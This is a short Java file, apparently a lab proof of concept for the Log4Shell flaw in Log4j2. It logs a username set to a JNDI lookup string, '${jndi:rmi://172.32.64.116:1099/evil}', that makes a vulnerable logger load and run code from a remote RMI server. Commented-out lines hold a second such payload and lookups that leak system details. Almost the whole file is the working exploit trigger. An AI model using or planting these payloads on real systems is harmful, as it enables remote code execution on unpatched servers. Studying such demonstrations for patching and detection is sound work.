package com.spring;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author 王景辉
 * @Site
 * @Create 2022-05-24-9:05
 **/
public class Log4j2 {
    private static final Logger LOGGER = LogManager.getLogger(Log4j2.class);

    public static void main(String[] args) {
//        String username = "${jndi:rmi://192.168.43.204:1099/evil}";
        String username = "${jndi:rmi://172.32.64.116:1099/evil}";
//        String username = "123";
//        String username = "${java:os}";
//        String username = "${java:vm}";
        LOGGER.info("Hello, {}", username);
        LOGGER.error("Hello, {}", username);
    }
}
